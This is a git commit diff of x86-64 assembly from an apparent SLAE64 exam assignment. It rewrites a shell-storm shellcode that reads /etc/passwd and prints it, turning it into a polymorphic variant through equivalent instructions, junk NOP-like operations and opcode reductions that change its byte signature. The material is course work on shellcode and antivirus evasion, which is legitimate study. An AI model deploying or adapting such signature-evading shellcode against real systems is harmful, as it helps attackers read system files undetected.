3264d0d66256eae39186bbb84f1d9fff59a9a9aa
David West <agentdaffaires@gmail.com>
2018-02-04 20:48:18 -0800

    modified:   6_shellstorm_polymorphics/878_polymorphics.s

--- SLAE64ExamAssignmentCode/6_shellstorm_polymorphics/878_polymorphics.s
+++ SLAE64ExamAssignmentCode/6_shellstorm_polymorphics/878_polymorphics.s
@@ -13,13 +13,14 @@ xor byte [rdi + 11], 0x41
   
 ;xor rax, rax
 ;add al, 2
-;------------
-push byte 2
-pop rax
+push byte 2				; symantically equiv
+pop rax					; symantically equiv
 
 
-;xor rsi, rsi ; set O_RDONLY flag
-; ----------------------------------
+xchg rbx, rbp				; nop equiv
+dec r10					; nop equiv
+
+;xor rsi, rsi ; set O_RDONLY flag	; opcode reduction
 xor esi, esi ; set O_RDONLY flag
 syscall
   
@@ -29,38 +30,38 @@ lea rsi, [rsp]
 mov rdi, rax
 ;xor rdx, rdx
 ;-------------
-xor edx, edx
+xor edx, edx				; opcode reduction
 mov dx, 0xfff; size to read
 ;xor rax, rax
 ;------------
-xor eax, eax
+xor eax, eax				; opcode reduction
+
+xor r10, rbp				; nop equiv
+cmp r10, rsp				; nop equiv 
 
 syscall
+
   
 ; syscall write to stdout
 ;xor rdi, rdi
 ;add dil, 1 ; set stdout fd = 1
-;-------------
-push byte 1
-pop rdi
+push byte 1 				; symantically equiv
+pop rdi					; symantically equiv
+
 mov rdx, rax
 ;xor rax, rax
 ;add al, 1
-;-------------
-push byte 1
-pop rax
+push byte 1				; symantically equiv
+pop rax					; symantically equiv
 syscall
   
 ; syscall exit
 ;xor rax, rax
 ;add al, 60
-;------------
-push byte 60
-pop rax
+push byte 60				; symantically equiv
+pop rax					; symantically equiv
 syscall
   
 _push_filename:
 call _readfile
 path: db "/etc/passwdA"
-  
-
